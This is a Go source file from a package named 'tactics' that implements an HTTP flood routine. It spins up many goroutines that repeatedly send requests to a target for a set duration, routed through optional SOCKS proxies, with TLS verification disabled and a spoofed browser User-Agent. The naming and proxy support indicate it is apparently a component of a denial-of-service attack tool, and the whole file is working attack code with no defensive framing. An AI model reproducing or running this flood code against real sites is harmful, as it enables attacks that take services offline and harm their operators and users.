package tactics

import (
	"context"
	"crypto/tls"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/proxy"
)

type floodConfig struct {
	httpMethod string
	body       string
	headers    map[string]string
	http2      bool
	keepAlive  bool
	rateLimit  int // per-thread req/s (0 = unlimited)
	proxyURL   string
}

var uaLegit = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36"

func buildTransport(p Params, cfg floodConfig) *http.Transport {
	tlsCfg := &tls.Config{InsecureSkipVerify: true}
	if cfg.http2 {
		tlsCfg.NextProtos = []string{"h2", "http/1.1"}
	} else {
		tlsCfg.NextProtos = []string{"http/1.1"}
	}

	dialer := &net.Dialer{Timeout: 10 * time.Second, KeepAlive: 30 * time.Second}
	var dialContext func(ctx context.Context, network, addr string) (net.Conn, error) = dialer.DialContext

	if cfg.proxyURL != "" {
		if u, err := url.Parse(cfg.proxyURL); err == nil {
			if sd, err := proxy.FromURL(u, dialer); err == nil {
				dialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
					type ctxDialer interface {
						DialContext(context.Context, string, string) (net.Conn, error)
					}
					if cd, ok := sd.(ctxDialer); ok {
						return cd.DialContext(ctx, network, addr)
					}
					return sd.Dial(network, addr)
				}
			}
		}
	}

	return &http.Transport{
		TLSClientConfig:       tlsCfg,
		MaxIdleConns:          p.Threads * 4,
		MaxIdleConnsPerHost:   p.Threads * 4,
		IdleConnTimeout:       90 * time.Second,
		DisableKeepAlives:     !cfg.keepAlive,
		ForceAttemptHTTP2:     cfg.http2,
		TLSHandshakeTimeout:   10 * time.Second,
		ResponseHeaderTimeout: 15 * time.Second,
		DialContext:           dialContext,
	}
}

func buildRequest(ctx context.Context, p Params, cfg floodConfig) *http.Request {
	method := cfg.httpMethod
	if method == "" {
		method = p.Method
	}
	var body io.Reader
	if cfg.body != "" {
		body = strings.NewReader(cfg.body)
	}
	req, err := http.NewRequestWithContext(ctx, method, p.Target, body)
	if err != nil {
		return nil
	}

	ua := p.UA
	if ua == "" || ua == "random" {
		ua = uaLegit
	}
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "*/*")

	if p.Cookie != "" && p.Cookie != "random" {
		req.Header.Set("Cookie", p.Cookie)
	}
	if p.Referer != "" && p.Referer != "random" {
		req.Header.Set("Referer", p.Referer)
	}
	for k, v := range cfg.headers {
		req.Header.Set(k, v)
	}
	if p.Header != "" {
		for _, part := range strings.Split(p.Header, "|") {
			if kv := strings.SplitN(part, ":", 2); len(kv) == 2 {
				req.Header.Set(strings.TrimSpace(kv[0]), strings.TrimSpace(kv[1]))
			}
		}
	}
	return req
}

func runFlood(ctx context.Context, p Params, cfg floodConfig) (int64, error) {
	p = withDefaults(p)
	if cfg.httpMethod == "" {
		cfg.httpMethod = p.Method
	}

	tr := buildTransport(p, cfg)
	defer tr.CloseIdleConnections()
	client := &http.Client{
		Transport: tr,
		CheckRedirect: func(*http.Request, []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	var count int64
	deadline := time.Now().Add(time.Duration(p.Duration) * time.Second)
	var wg sync.WaitGroup

	for i := 0; i < p.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			var ticker *time.Ticker
			if cfg.rateLimit > 0 {
				ticker = time.NewTicker(time.Second / time.Duration(cfg.rateLimit))
				defer ticker.Stop()
			}
			for {
				if ctx.Err() != nil || time.Now().After(deadline) {
					return
				}
				if ticker != nil {
					select {
					case <-ctx.Done():
						return
					case <-ticker.C:
					}
				}
				req := buildRequest(ctx, p, cfg)
				if req == nil {
					return
				}
				resp, err := client.Do(req)
				if err != nil {
					continue
				}
				atomic.AddInt64(&count, 1)
				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()
			}
		}()
	}
	wg.Wait()
	return atomic.LoadInt64(&count), nil
}

func randInt(n int) int {
	if n <= 0 {
		return 0
	}
	return rand.Intn(n)
}
